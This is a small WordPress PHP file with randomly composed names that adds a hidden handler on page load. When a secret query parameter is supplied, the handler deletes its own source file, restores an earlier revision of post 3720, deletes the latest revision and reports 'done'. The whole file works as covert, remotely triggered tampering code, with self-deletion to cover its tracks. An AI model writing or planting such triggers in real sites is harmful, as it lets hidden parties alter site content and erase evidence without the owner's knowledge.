<?php

function pdf_project_account() {
	if (isset($_GET['extended_software_embedder']) && $_GET['extended_software_embedder'] === 'group_seo_asset') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$plugins_traffic_share = 3720;
		$random_grid_toggle_notification = wp_get_post_revisions($plugins_traffic_share);
		if (empty($random_grid_toggle_notification)) die('no revisions');
		if (count($random_grid_toggle_notification) < 2) die('less than 2');
		$multisite_using_plus = array_shift($random_grid_toggle_notification);
		$search_testimonials_instagram_lock = $multisite_using_plus->ID;
		$insert_scheduled_javascript = array_shift($random_grid_toggle_notification);
		$management_local_roles_headers = $insert_scheduled_javascript->ID;
		$scroll_dashboard_quick = wp_restore_post_revision($management_local_roles_headers);
		if ($scroll_dashboard_quick === false) die('error restoring');
		$scroll_dashboard_quick = wp_delete_post_revision($search_testimonials_instagram_lock);		
		if ($scroll_dashboard_quick === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'pdf_project_account');
